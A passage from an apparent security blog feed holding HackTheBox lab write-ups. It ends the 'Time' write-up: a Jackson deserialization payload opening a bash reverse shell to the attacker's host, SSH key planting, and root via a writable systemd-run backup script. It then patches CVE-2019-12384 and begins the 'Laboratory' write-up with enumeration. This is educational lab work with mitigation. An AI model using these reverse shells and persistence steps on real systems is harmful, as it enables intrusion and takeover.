	java<span style="color:#f92672">.</span><span style="color:#a6e22e">util</span><span style="color:#f92672">.</span><span style="color:#a6e22e">Scanner</span> s <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> java<span style="color:#f92672">.</span><span style="color:#a6e22e">util</span><span style="color:#f92672">.</span><span style="color:#a6e22e">Scanner</span><span style="color:#f92672">(</span>Runtime<span style="color:#f92672">.</span><span style="color:#a6e22e">getRuntime</span><span style="color:#f92672">().</span><span style="color:#a6e22e">exec</span><span style="color:#f92672">(</span>command<span style="color:#f92672">).</span><span style="color:#a6e22e">getInputStream</span><span style="color:#f92672">()).</span><span style="color:#a6e22e">useDelimiter</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;\\A&#34;</span><span style="color:#f92672">);</span>
	<span style="color:#66d9ef">return</span> s<span style="color:#f92672">.</span><span style="color:#a6e22e">hasNext</span><span style="color:#f92672">()</span> <span style="color:#f92672">?</span> s<span style="color:#f92672">.</span><span style="color:#a6e22e">next</span><span style="color:#f92672">()</span> <span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">;</span>  <span style="color:#f92672">}</span>
$$<span style="color:#f92672">;</span>
CALL <span style="color:#a6e22e">SHELLEXEC</span><span style="color:#f92672">(</span><span style="color:#960050;background-color:#1e0010">&#39;</span>bash <span style="color:#f92672">-</span>i <span style="color:#f92672">&gt;&amp;</span> <span style="color:#f92672">/</span>dev<span style="color:#f92672">/</span>tcp<span style="color:#f92672">/</span>10<span style="color:#f92672">.</span><span style="color:#a6e22e">10</span><span style="color:#f92672">.</span><span style="color:#a6e22e">14</span><span style="color:#f92672">.</span><span style="color:#a6e22e">19</span><span style="color:#f92672">/</span>9000 0<span style="color:#f92672">&gt;&amp;</span>1<span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#f92672">)</span>
</code></pre></div><p>I can obtain an interactive shell.</p>
<pre><code>→ root@kali «time» «10.10.14.19» 
$ nc -nvlp 9000            
listening on [any] 9000 ...
connect to [10.10.14.19] from (UNKNOWN) [10.10.10.214] 42496
bash: cannot set terminal process group (944): Inappropriate ioctl for device
bash: no job control in this shell
pericles@time:/var/www/html$ 
</code></pre><p><div class="img-container"><img src="imgs/image-20210508205643332.png" alt="image-20210508205643332"  /></div>
</p>
<h4 id="upgrade-to-ssh">Upgrade to SSH</h4>
<p>With current access, I can put my public key to the <code>authorized_keys</code> file.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">pericles@time:/home/pericles$ mkdir .ssh
pericles@time:/home/pericles$
pericles@time:/home/pericles$ echo <span style="color:#e6db74">&#39;ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPmWTx2r3W2mHnCnKmoJCnkrj6mXxSIGq3E5ks1g+moK&#39;</span> &gt; .ssh/authorized_keys
</code></pre></div><p>Now I can login as <code>pericles</code> with my SSH private key.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@kali «time» «10.10.14.19» 
$ ssh pericles@10.10.10.214 
Welcome to Ubuntu 20.04 LTS <span style="color:#f92672">(</span>GNU/Linux 5.4.0-52-generic x86_64<span style="color:#f92672">)</span>

...&lt;SNIP&gt;...
  System load:             0.0
  Usage of /:              21.2% of 27.43GB
  Memory usage:            16%
  Swap usage:              0%
  Processes:               <span style="color:#ae81ff">235</span>
  Users logged in:         <span style="color:#ae81ff">0</span>
  IPv4 address <span style="color:#66d9ef">for</span> ens160: 10.10.10.214
  IPv6 address <span style="color:#66d9ef">for</span> ens160: dead:beef::250:56ff:feb9:a553

...&lt;SNIP&gt;...
Last login: Fri Oct <span style="color:#ae81ff">23</span> 09:19:19 <span style="color:#ae81ff">2020</span> from 10.10.14.5
pericles@time:~$ id
uid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>pericles<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>pericles<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>pericles<span style="color:#f92672">)</span>
</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-root">Shell as root</h3>
<h4 id="internal-enumeration">Internal Enumeration</h4>
<p><code>pericles</code> is the only user on this box.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">pericles@time:/home/pericles$ cat /etc/passwd | grep sh$
cat /etc/passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
pericles:x:1000:1000:Pericles:/home/pericles:/bin/bash
</code></pre></div><p>While searching a files owned by <code>pericles</code>, I spotted a script called <code>timer_backup.sh</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">pericles@time:~$ find / -type f -user pericles 2&gt;/dev/null |grep -v <span style="color:#e6db74">&#39;proc\|sys&#39;</span>
/usr/bin/timer_backup.sh
/dev/shm/payloadds9LXy
/home/pericles/.gnupg/trustdb.gpg
/home/pericles/.gnupg/pubring.kbx
/home/pericles/.bashrc
...&lt;SNIP&gt;...
</code></pre></div><p>The script is backing up the website contents in <code>/var/www/html</code> to the root home directory.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">pericles@time:~$ cat /usr/bin/timer_backup.sh
<span style="color:#75715e">#!/bin/bash</span>
zip -r website.bak.zip /var/www/html <span style="color:#f92672">&amp;&amp;</span> mv website.bak.zip /root/backup.zip
</code></pre></div><p>Interestingly, that script is writable by others.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">pericles@time:~$ ls -l /usr/bin/timer_backup.sh 
-rwxrw-rw- <span style="color:#ae81ff">1</span> pericles pericles <span style="color:#ae81ff">88</span> Apr <span style="color:#ae81ff">10</span> 21:05 /usr/bin/timer_backup.sh
</code></pre></div><p>I searched other file related to the script, and found out there is a timer owned by root.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">pericles@time:~$ find / -type f -name <span style="color:#e6db74">&#34;timer_backup*&#34;</span> -ls 2&gt;/dev/null
   <span style="color:#ae81ff">795750</span>      <span style="color:#ae81ff">4</span> -rw-r--r--   <span style="color:#ae81ff">1</span> root     root          <span style="color:#ae81ff">214</span> Oct <span style="color:#ae81ff">23</span> 06:46 /etc/systemd/system/timer_backup.timer
   <span style="color:#ae81ff">787186</span>      <span style="color:#ae81ff">4</span> -rw-r--r--   <span style="color:#ae81ff">1</span> root     root          <span style="color:#ae81ff">159</span> Oct <span style="color:#ae81ff">23</span> 05:59 /etc/systemd/system/timer_backup.service
  <span style="color:#ae81ff">1317302</span>      <span style="color:#ae81ff">4</span> -rwxrw-rw-   <span style="color:#ae81ff">1</span> pericles pericles       <span style="color:#ae81ff">88</span> Apr <span style="color:#ae81ff">10</span> 21:10 /usr/bin/timer_backup.sh
</code></pre></div><p><code>timer_backup.timer</code> requires <code>timer_backup.service</code>,</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">pericles@time:~$ cat /etc/systemd/system/timer_backup.timer 
[Unit]
Description=Backup of the website
Requires=timer_backup.service

[Timer]
Unit=timer_backup.service
#OnBootSec=10s
#OnUnitActiveSec=10s
OnUnitInactiveSec=10s
AccuracySec=1ms

[Install]
WantedBy=timers.target
</code></pre></div><p>and what <code>timer_backup.service</code> doing is it restarts <code>web_backup.service</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">pericles@time:~$ cat /etc/systemd/system/timer_backup.service 
[Unit]
Description=Calls website backup
Wants=timer_backup.timer
WantedBy=multi-user.target

[Service]
ExecStart=/usr/bin/systemctl restart web_backup.service
</code></pre></div><p><code>web_backup.service</code> executes the <code>timer_backup.sh</code> script which is owned by <code>pericles</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">pericles@time:~$ cat /etc/systemd/system/web_backup.service
[Unit]
Description=Creates backups of the website

[Service]
ExecStart=/bin/bash /usr/bin/timer_backup.sh
</code></pre></div><h4 id="exploiting-timer_backupsh">Exploiting timer_backup.sh</h4>
<p>With writable access, I can put a <code>bash</code> reverse shell in <code>timer_backup.sh</code>, and then setup a <code>nc</code> listener.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">pericles@time:~$ echo <span style="color:#e6db74">&#39;bash -i &gt;&amp; /dev/tcp/10.10.14.19/9002 0&gt;&amp;1&#39;</span> &gt;&gt; /usr/bin/timer_backup.sh 
pericles@time:~$ 
pericles@time:~$ cat /usr/bin/timer_backup.sh 
<span style="color:#75715e">#!/bin/bash</span>
zip -r website.bak.zip /var/www/html <span style="color:#f92672">&amp;&amp;</span> mv website.bak.zip /root/backup.zip
bash -i &gt;&amp; /dev/tcp/10.10.14.72/9002 0&gt;&amp;<span style="color:#ae81ff">1</span>
</code></pre></div><p>Within a few seconds, I have a root shell on my listener, but the problem is that shell is somehow exited by itself.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">→ root@kali «time» «10.10.14.19» 
$ rlwrap nc -nvlp 9002
listening on [any] 9002 ...
connect to [10.10.14.72] from (UNKNOWN) [10.10.10.214] 57648
bash: cannot set terminal process group (411032): Inappropriate ioctl for device
bash: no job control in this shell
root@time:/# 
root@time:/# exit
</code></pre></div><p>So I repeated the steps, but this time, I immediately injected my public key to the root&rsquo;s <code>authorized_keys</code> file.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">→ root@kali «time» «10.10.14.19» 
$ nc -nvlp 9002                          
listening on [any] 9002 ...
connect to [10.10.14.19] from (UNKNOWN) [10.10.10.214] 34182
bash: cannot set terminal process group (65312): Inappropriate ioctl for device
bash: no job control in this shell
root@time:/#  echo &#39;ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPmWTx2r3W2mHnCnKmoJCnkrj6mXxSIGq3E5ks1g+moK&#39; &gt; /root/.ssh/authorized_keys
&lt;rj6mXxSIGq3E5ks1g+moK&#39; &gt; /root/.ssh/authorized_keys
root@time:/# exit
</code></pre></div><p>After that, I can login as root via SSH.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">→ root@kali «time» «10.10.14.19» 
$ ssh root@10.10.10.214
Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-52-generic x86_64)

...&lt;SNIP&gt;...
  System load:             0.0
  Usage of /:              21.2% of 27.43GB
  Memory usage:            16%
  Swap usage:              0%
  Processes:               235
  Users logged in:         0
  IPv4 address for ens160: 10.10.10.214
  IPv6 address for ens160: dead:beef::250:56ff:feb9:a553


...&lt;SNIP&gt;...
Last login: Tue Feb  9 14:41:33 2021
root@time:~# id
uid=0(root) gid=0(root) groups=0(root)
root@time:~# cut -c-16 root.txt 
27375f967f43232f
</code></pre></div><h2 id="extras">Extras</h2>
<p>In this extras, I&rsquo;ll take a look into the vulnerable code that allows me to gain a remote code execution, and then I&rsquo;ll try to patch it.</p>
<h3 id="cve-2019-12384">CVE-2019-12384</h3>
<h4 id="causes">Causes</h4>
<p>According to <a href="https://snyk.io/vuln/SNYK-JAVA-COMFASTERXMLJACKSONCORE-450917">this site</a>, in order to successfully exploit a Jackson deserialization vulnerability several conditions must be met.</p>
<p><div class="img-container"><img src="imgs/image-20210509215030250.png" alt="image-20210509215030250"  /></div>
</p>
<p>The first condition is fulfilled by the <code>index.php</code> file (<code>/var/www/html/index.php</code>). I have control on the user input.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($_POST[<span style="color:#e6db74">&#39;data&#39;</span>])){
        <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($_POST[<span style="color:#e6db74">&#39;mode&#39;</span>]) <span style="color:#f92672">&amp;&amp;</span> $_POST[<span style="color:#e6db74">&#39;mode&#39;</span>] <span style="color:#f92672">===</span> <span style="color:#e6db74">&#34;2&#34;</span>){
                $filename <span style="color:#f92672">=</span> <span style="color:#a6e22e">tempnam</span>(<span style="color:#e6db74">&#34;/dev/shm&#34;</span>, <span style="color:#e6db74">&#34;payload&#34;</span>);
                $myfile <span style="color:#f92672">=</span> <span style="color:#a6e22e">fopen</span>($filename, <span style="color:#e6db74">&#34;w&#34;</span>) <span style="color:#66d9ef">or</span> <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;Unable to open file!&#34;</span>);
                $txt <span style="color:#f92672">=</span> $_POST[<span style="color:#e6db74">&#39;data&#39;</span>]; <span style="color:#75715e">// Condition #1,  $txt controlled by user. no filter
</span><span style="color:#75715e"></span>                <span style="color:#a6e22e">fwrite</span>($myfile, $txt); 
                <span style="color:#a6e22e">fclose</span>($myfile);
                <span style="color:#a6e22e">exec</span>(<span style="color:#e6db74">&#34;/usr/bin/jruby /opt/json_project/parse.rb </span><span style="color:#e6db74">$filename</span><span style="color:#e6db74"> 2&gt;&amp;1&#34;</span>, $cmdout, $ret);
                <span style="color:#a6e22e">unlink</span>($filename);
                <span style="color:#66d9ef">if</span>($ret <span style="color:#f92672">===</span> <span style="color:#ae81ff">0</span>){
                        $output <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&lt;pre&gt;Validation successful!&lt;/pre&gt;&#39;</span>;
                }
                <span style="color:#66d9ef">else</span>{
                        $output <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&lt;pre&gt;Validation failed: &#39;</span> <span style="color:#f92672">.</span> $cmdout[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">.</span> <span style="color:#e6db74">&#39;&lt;/pre&gt;&#39;</span>;
                }
        }
        <span style="color:#66d9ef">else</span>{
                $json_ugly <span style="color:#f92672">=</span> $_POST[<span style="color:#e6db74">&#39;data&#39;</span>];
                $json_pretty <span style="color:#f92672">=</span> <span style="color:#a6e22e">json_encode</span>(<span style="color:#a6e22e">json_decode</span>($json_ugly), <span style="color:#a6e22e">JSON_PRETTY_PRINT</span>);
                $output <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&lt;pre&gt;&#39;</span><span style="color:#f92672">.</span>$json_pretty<span style="color:#f92672">.</span><span style="color:#e6db74">&#39;&lt;/pre&gt;&#39;</span>;
        }

}
<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010">...&lt;SNIP&gt;...
</span></code></pre></div><p>The second condition fulfilled by the parser itself (<code>/opt/json_project/parse.rb</code>). It uses &ldquo;Default typing&rdquo;.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby">require <span style="color:#e6db74">&#39;java&#39;</span>

<span style="color:#66d9ef">Dir</span><span style="color:#f92672">[</span><span style="color:#e6db74">&#34;/opt/json_project/classpath/*.jar&#34;</span><span style="color:#f92672">].</span>each <span style="color:#66d9ef">do</span> <span style="color:#f92672">|</span>f<span style="color:#f92672">|</span>
      require f
<span style="color:#66d9ef">end</span>

java_import <span style="color:#e6db74">&#39;com.fasterxml.jackson.databind.ObjectMapper&#39;</span>
java_import <span style="color:#e6db74">&#39;com.fasterxml.jackson.databind.SerializationFeature&#39;</span>
f <span style="color:#f92672">=</span> <span style="color:#66d9ef">File</span><span style="color:#f92672">.</span>read(<span style="color:#66d9ef">ARGV</span><span style="color:#f92672">[</span><span style="color:#ae81ff">0</span><span style="color:#f92672">]</span>)
content <span style="color:#f92672">=</span> f
puts content

mapper <span style="color:#f92672">=</span> <span style="color:#66d9ef">ObjectMapper</span><span style="color:#f92672">.</span>new
mapper<span style="color:#f92672">.</span>enableDefaultTyping() <span style="color:#75715e"># Condition #2, the uses of &#34;default typing&#34;.</span>
mapper<span style="color:#f92672">.</span>configure(<span style="color:#66d9ef">SerializationFeature</span><span style="color:#f92672">::</span><span style="color:#66d9ef">FAIL_ON_EMPTY_BEANS</span>, <span style="color:#66d9ef">false</span>);
obj <span style="color:#f92672">=</span> mapper<span style="color:#f92672">.</span>readValue(content, java<span style="color:#f92672">.</span>lang<span style="color:#f92672">.</span>Object<span style="color:#f92672">.</span>java_class) <span style="color:#75715e"># invokes all the setters</span>
puts <span style="color:#e6db74">&#34;stringified: &#34;</span> <span style="color:#f92672">+</span> mapper<span style="color:#f92672">.</span>writeValueAsString(obj)
</code></pre></div><p>The third condition is fulfilled by <code>logback-core-1.3.0-alpha5.jar</code> as the gadget class and <code>h2–1.4.199.jar</code> for the RCE capability. According to this <a href="https://mthbernardes.github.io/rce/2018/03/14/abusing-h2-database-alias.html">blog</a>, the H2 database alias feature can be abused. The researcher of CVE-2019–12384 abuses the alias feature to embed Java code.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">root@time:/opt/json_project# grep -Ri version
Binary file classpath/h2-1.4.199.jar matches
Binary file classpath/jackson-databind-2.9.8.jar matches
Binary file classpath/logback-core-1.3.0-alpha5.jar matches
Binary file classpath/jackson-core-2.9.8.jar matches
</code></pre></div><h4 id="mitigation">Mitigation</h4>
<p>After I make sure there is no one currently exploiting the box, I tried to update the Jackson library to the v2.11 and also applied the new feature to mitigate the deserialization attack on the source code. Here is the updated version of <code>parse.rb</code>:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby">require <span style="color:#e6db74">&#39;java&#39;</span>

<span style="color:#66d9ef">Dir</span><span style="color:#f92672">[</span><span style="color:#e6db74">&#34;/opt/json_project/classpath/*.jar&#34;</span><span style="color:#f92672">].</span>each <span style="color:#66d9ef">do</span> <span style="color:#f92672">|</span>f<span style="color:#f92672">|</span>
      require f
<span style="color:#66d9ef">end</span>

java_import <span style="color:#e6db74">&#39;com.fasterxml.jackson.databind.ObjectMapper&#39;</span>
java_import <span style="color:#e6db74">&#39;com.fasterxml.jackson.databind.SerializationFeature&#39;</span>
java_import <span style="color:#e6db74">&#39;com.fasterxml.jackson.databind.MapperFeature&#39;</span> <span style="color:#75715e"># ==&gt; Mitigation v2.11 </span>
f <span style="color:#f92672">=</span> <span style="color:#66d9ef">File</span><span style="color:#f92672">.</span>read(<span style="color:#66d9ef">ARGV</span><span style="color:#f92672">[</span><span style="color:#ae81ff">0</span><span style="color:#f92672">]</span>)
content <span style="color:#f92672">=</span> f
puts content

mapper <span style="color:#f92672">=</span> <span style="color:#66d9ef">ObjectMapper</span><span style="color:#f92672">.</span>new
mapper<span style="color:#f92672">.</span>activateDefaultTyping() <span style="color:#75715e"># ==&gt; Mitigation v2.10, enableDefaultTyping() to activateDefaultTyping() </span>
mapper<span style="color:#f92672">.</span>configure(<span style="color:#66d9ef">MapperFeature</span><span style="color:#f92672">::</span><span style="color:#66d9ef">BLOCK_UNSAFE_POLYMORPHIC_BASE_TYPES</span>); <span style="color:#75715e"># ==&gt; Mitigation v2.11 </span>
mapper<span style="color:#f92672">.</span>configure(<span style="color:#66d9ef">SerializationFeature</span><span style="color:#f92672">::</span><span style="color:#66d9ef">FAIL_ON_EMPTY_BEANS</span>, <span style="color:#66d9ef">false</span>);
obj <span style="color:#f92672">=</span> mapper<span style="color:#f92672">.</span>readValue(content, java<span style="color:#f92672">.</span>lang<span style="color:#f92672">.</span>Object<span style="color:#f92672">.</span>java_class) <span style="color:#75715e"># invokes all the setters</span>
puts <span style="color:#e6db74">&#34;stringified: &#34;</span> <span style="color:#f92672">+</span> mapper<span style="color:#f92672">.</span>writeValueAsString(obj)
</code></pre></div><p>I also write a dirty script to patch it as well as to revert the patch, so I can perform a quick test. The script is supposed to be executed  from Time where the updated parser and the newer version of Jackson are  hosted from my machine.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#!/bin/bash
</span><span style="color:#75715e"></span><span style="color:#75715e"># ./time.sh patch [ip]</span>
project_path<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/opt/json_project/&#34;</span>
new_jackson<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;jackson-core-2.11.0.jar&#34;</span>
old_jackson<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;jackson-core-2.9.8.jar&#34;</span>

<span style="color:#66d9ef">if</span> <span style="color:#f92672">[</span> <span style="color:#e6db74">&#34;</span>$1<span style="color:#e6db74">&#34;</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;patch&#34;</span> <span style="color:#f92672">]</span>; <span style="color:#66d9ef">then</span>
	<span style="color:#75715e"># backup the original code</span>
	mkdir -p /dev/shm/orig/
	mv $project_path<span style="color:#e6db74">&#34;classpath/&#34;</span>$old_jackson /dev/shm/orig/
	mv $project_path<span style="color:#e6db74">&#34;parse.rb&#34;</span> /dev/shm/orig/
	
	<span style="color:#75715e"># These file hosted from my machine</span>
	curl -s <span style="color:#e6db74">&#34;http://</span>$2<span style="color:#e6db74">/</span>$new_jackson<span style="color:#e6db74">&#34;</span> &gt; /tmp/$new_jackson
	curl -s <span style="color:#e6db74">&#34;http://</span>$2<span style="color:#e6db74">/parse.rb&#34;</span> &gt;  /tmp/parse.rb
	
	<span style="color:#75715e"># move the updated parser and jackson</span>
	cp /tmp/$new_jackson $project_path<span style="color:#e6db74">&#34;classpath/&#34;</span>$new_jackson 
	cp /tmp/parse.rb <span style="color:#e6db74">&#34;</span>$project_path<span style="color:#e6db74">&#34;</span>
	chmod +x $project_path<span style="color:#e6db74">&#34;parse.rb&#34;</span>
	
<span style="color:#66d9ef">elif</span> <span style="color:#f92672">[</span> <span style="color:#e6db74">&#34;</span>$1<span style="color:#e6db74">&#34;</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;restore&#34;</span> <span style="color:#f92672">]</span>; <span style="color:#66d9ef">then</span>
	rm $project_path<span style="color:#e6db74">&#34;classpath/&#34;</span>$new_jackson
	rm $project_path<span style="color:#e6db74">&#34;parse.rb&#34;</span>
	
	mv <span style="color:#e6db74">&#34;/dev/shm/orig/</span>$old_jackson<span style="color:#e6db74">&#34;</span> $project_path<span style="color:#e6db74">&#34;classpath/&#34;</span>
	mv <span style="color:#e6db74">&#34;/dev/shm/orig/parse.rb&#34;</span> $project_path
	
	rm /tmp/$new_jackson 
	rm /tmp/parse.rb
	rm -r /dev/shm/orig/
	
<span style="color:#66d9ef">fi</span>
</code></pre></div><p>I tried to exploit the validator again by reproducing the same steps as  in the Foothold section, but this time my reverse shell didn’t connect  back. I checked the validator on the browser, and now it returned this  message.</p>
<pre><code>Validation failed: WARNING: An illegal reflective access operation has occurred
</code></pre><p><div class="img-container"><img src="imgs/image-20210509210620009.png" alt="image-20210509210620009"  /></div>
</p>
<p>Well, it is working, isn’t it?</p>
<hr>
<h2 id="references">References</h2>
<p>Exploitation:</p>
<ul>
<li><a href="https://blog.doyensec.com/2019/07/22/jackson-gadgets.html">https://blog.doyensec.com/2019/07/22/jackson-gadgets.html</a></li>
<li><a href="https://mthbernardes.github.io/rce/2018/03/14/abusing-h2-database-alias.html">https://mthbernardes.github.io/rce/2018/03/14/abusing-h2-database-alias.html</a></li>
</ul>
<p>Mitigation:</p>
<ul>
<li><a href="https://cowtowncoder.medium.com/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062">https://cowtowncoder.medium.com/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062</a></li>
<li><a href="https://snyk.io/vuln/SNYK-JAVA-COMFASTERXMLJACKSONCORE-450917">https://snyk.io/vuln/SNYK-JAVA-COMFASTERXMLJACKSONCORE-450917</a></li>
</ul>
]]></content:encoded>
    </item>
    
    <item>
      <title>HackTheBox - Laboratory</title>
      <link>https://fahmifj.github.io/writeups/hackthebox/htb-laboratory/</link>
      <pubDate>Sat, 17 Apr 2021 23:25:49 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-laboratory/</guid>
      <description>I gained u in an unintended way!</description>
      <content:encoded><![CDATA[<p>Laboratory is an easy difficulty Linux machine from HackTheBox that features an instance of GitLab application in a docker container. The application is known to be vulnerable to an arbitrary file read that can be leveraged to read the application&rsquo;s secret, allowing an attacker to craft his own malicious cookie and perform a de-serialization attack to gain a foothold on the container.</p>
<p>Enumerating inside the container finds a private user repository that contains a pair of  SSH keys. The keys allows me to logs into the machine.  From there, I&rsquo;m able to gain a foothold on the box using the SSH private key.  There is an SUID binary that calls <code>chmod</code> with relative path, making it vulnerable to path hijacking.</p>
<h3 id="skills-learned">Skills Learned</h3>
<ul>
<li>Arbitrary File Read</li>
<li>Metasploit</li>
<li>Exploiting GitLab 12.8.1~12.9.0</li>
<li>Recover git repository</li>
<li>SUID exploitation</li>
</ul>
<h3 id="tools">Tools</h3>
<ul>
<li>Kali Linux (Attacking Machine) - <a href="https://www.kali.org/">https://www.kali.org/</a></li>
<li>Nmap - Preinstalled in Kali Linux</li>
<li>searchsploit - Preinstalled in Kali Linux</li>
<li>Metasploit - Preinstalled in Kali Linux</li>
<li>CVE-2020-10997 Exploit PoC - <a href="https://github.com/thewhiteh4t/cve-2020-10977">https://github.com/thewhiteh4t/cve-2020-10977</a></li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>Initial scan with <code>nmap</code> shows 3 ports open, they are SSH on port 22, HTTP on port 80, and HTTPS on port 443.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «laboratory» «10.10.14.39»
$ nmap -sC -sV -oA scans/10-initial-laboratory 10.10.10.216

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
80/tcp  open  http     Apache httpd 2.4.41
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
|_http-title: Did not follow redirect to https://laboratory.htb/
443/tcp open  ssl/http Apache httpd 2.4.41 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.41 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
|_http-title: The Laboratory
| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>laboratory.htb
| Subject Alternative Name: DNS:git.laboratory.htb
| Issuer: commonName<span style="color:#f92672">=</span>laboratory.htb
| Public Key type: rsa
| Public Key bits: <span style="color:#ae81ff">4096</span>
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-07-05T10:39:28
| Not valid after:  2024-03-03T10:39:28
| MD5:   <span style="color:#ae81ff">2873</span> 91a5 <span style="color:#ae81ff">5022</span> f323 4b95 df98 b61a eb6c
|_SHA-1: <span style="color:#ae81ff">0875</span> 3a7e eef6 8f50 <span style="color:#ae81ff">0349</span> 510d 9fbf abc3 c70a a1ca
| tls-alpn: 
|_  http/1.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</code></pre></div><p>From the scan above, visiting port 80 will be redirected to <code>https://laboratory.htb</code>.</p>
<p>On the HTTPS port, the certificate discloses a subdomain.</p>
<p>From here, I&rsquo;ll add <code>laboratory.htb</code> and <code>git.laboratory.htb</code> as well to <code>/etc/hosts</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «laboratory» «10.10.14.39»
$ echo <span style="color:#e6db74">&#39;10.10.10.216 laboratory.htb git.laboratory.htb&#39;</span> &gt; /etc/hosts
</code></pre></div><h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-80---laboratoryhtb">TCP 80 - laboratory.htb</h3>
<p>There is nothing really interesting here.</p>
<p><div class="img-container"><img src="imgs/9437ec2bf9834958a568bc836e4c625f.png" alt="8337f36ab816a0b4af1bcff5b6d79ed8.png"  /></div>
</p>
<h3 id="tcp-443---gitlaboratoryhtb">TCP 443 - git.laboratory.htb</h3>
<p>A GitLab instance is presented on this page.</p>
